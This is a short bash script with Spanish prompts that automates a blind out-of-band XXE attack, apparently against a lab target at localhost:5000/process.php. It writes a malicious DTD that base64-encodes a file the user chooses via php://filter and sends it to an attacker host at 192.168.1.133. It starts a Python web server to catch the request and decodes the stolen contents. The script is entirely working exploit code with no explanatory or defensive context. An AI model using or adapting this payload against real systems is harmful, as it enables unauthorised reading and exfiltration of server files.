#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.133/?file=%file;'>\">
%eval;
%exfil;"""

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.133/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>12345678</tel><email>test@test.com</email><password>test1234</password></root>' &>/dev/null

echo

cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d; echo

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
